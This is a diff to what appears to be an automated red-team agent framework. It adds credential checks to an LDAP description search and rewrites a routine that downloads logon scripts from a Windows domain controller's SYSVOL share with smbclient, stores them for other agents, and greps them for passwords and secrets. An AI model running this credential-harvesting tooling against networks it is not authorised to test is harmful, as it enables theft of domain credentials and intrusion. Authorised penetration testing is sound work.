@@ -33,6 +33,7 @@ from ares.tools.red.common import (
     resolve_host_or_ip,
     resolve_password,
     run_tool,
+    store_remote_artifact,
     write_users_file_remote,
 )
 
@@ -267,8 +268,13 @@ class CredentialDiscoveryTools(Toolset):
         Example:
             >>> ldap_search_descriptions("192.168.56.10", "example.local", "user", "pass")
         """
+        # Validate required credentials
+        if not username or not username.strip():
+            return "[!] LDAP search requires a valid username. Cannot search without credentials."
         resolved_password = self._resolve_password(username, domain, password)
-        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+        if not resolved_password or not resolved_password.strip():
+            return "[!] LDAP search requires a valid password. Cannot search without credentials."
+        if resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
             return "[!] Refusing to use placeholder password; provide a real credential."
         if self.state and hasattr(self.state, "add_domain"):
             self.state.add_domain(domain)
@@ -1890,43 +1896,80 @@ class SharePilferingTools(Toolset):
             # First, enumerate and download scripts from SYSVOL/scripts folder
             script_extensions = ["*.bat", "*.cmd", "*.ps1", "*.vbs", "*.wsf", "*.inf"]
 
-            # Use smbclient to list and cat script files
+            # Use Linux smbclient (not Impacket's smbclient.py) which supports -c flag
+            # Route to recon pod which has native smbclient installed
+            sysvol_share = f"//{target}/SYSVOL"
+            scripts_path = f"{domain}/scripts"
+
             for ext in script_extensions:
+                # List files matching extension in scripts folder
                 list_cmd = [
-                    "smbclient.py",
-                    f"{domain}/{username}:{resolved_password}@{target}",
+                    "smbclient",
+                    sysvol_share,
+                    "-U",
+                    f"{domain}/{username}%{resolved_password}",
                     "-c",
-                    f"use SYSVOL; cd {domain}\\scripts; ls {ext}",
+                    f"cd {scripts_path}; ls {ext}",
                 ]
-                stdout, stderr, _ = run_tool(list_cmd, timeout_seconds=60)
+                # Route to recon pod (has native smbclient)
+                stdout, stderr, returncode = run_tool(
+                    list_cmd, timeout_seconds=60, target_role="recon"
+                )
                 output = stdout + "\n" + (stderr or "")
 
+                # Skip if access denied or share not found
+                if returncode != 0 and (
+                    "NT_STATUS_ACCESS_DENIED" in output or "NT_STATUS_" in output
+                ):
+                    continue
+
                 # Extract script filenames from smbclient output
+                # smbclient lists files like: "  filename.bat                     A     1234  Mon Jan 1 12:00:00 2024"
                 script_files: list[str] = []
                 for line in output.splitlines():
-                    # smbclient lists files like: "filename.bat  A  1234  date"
-                    if ext.replace("*", "") in line.lower():
-                        parts = line.strip().split()
-                        if parts:
+                    line_stripped = line.strip()
+                    if not line_stripped or line_stripped.startswith("NT_STATUS"):
+                        continue
+                    # Match lines with file attributes (A = archive, etc.)
+                    if ext.replace("*", "") in line_stripped.lower():
+                        # First non-whitespace token is the filename
+                        parts = line_stripped.split()
+                        if parts and not parts[0].startswith("."):
                             script_files.append(parts[0])
 
                 # Download and search each script for passwords
                 for script_file in script_files[:20]:  # Limit to prevent timeout
-                    cat_cmd = [
-                        "smbclient.py",
-                        f"{domain}/{username}:{resolved_password}@{target}",
+                    get_cmd = [
+                        "smbclient",
+                        sysvol_share,
+                        "-U",
+                        f"{domain}/{username}%{resolved_password}",
                         "-c",
-                        f"use SYSVOL; cd {domain}\\scripts; get {script_file} /tmp/sysvol_script.txt",
+                        f"cd {scripts_path}; get {script_file} /tmp/sysvol_script.txt",
                     ]
-                    run_tool(cat_cmd, timeout_seconds=30)
+                    # Route to recon pod (has native smbclient)
+                    run_tool(get_cmd, timeout_seconds=30, target_role="recon")
 
-                    # Search the downloaded file for password patterns
+                    # Store the downloaded script as a shared artifact for all agents
+                    if self.state:
+                        artifact_key = f"sysvol/{domain}/{script_file}"
+                        store_remote_artifact(
+                            self.state,
+                            "/tmp/sysvol_script.txt",  # noqa: S108  # nosec B108 - remote pod path
+                            artifact_key,
+                            target_role="recon",
+                            source_agent="credential_discovery",
+                        )
+
+                    # Search the downloaded file for password patterns (also on recon where file was downloaded)
                     grep_cmd = [
                         "bash",
                         "-lc",
                         "grep -iE '(password|passwd|pwd|cred|secret)\\s*[=:]' /tmp/sysvol_script.txt 2>/dev/null || true",
                     ]
-                    grep_stdout, _grep_stderr, _ = run_tool(grep_cmd, timeout_seconds=10)
+                    grep_stdout, _grep_stderr, _ = run_tool(
+                        grep_cmd, timeout_seconds=10, target_role="recon"
+                    )
                     grep_output = grep_stdout.strip()
 
                     if grep_output:
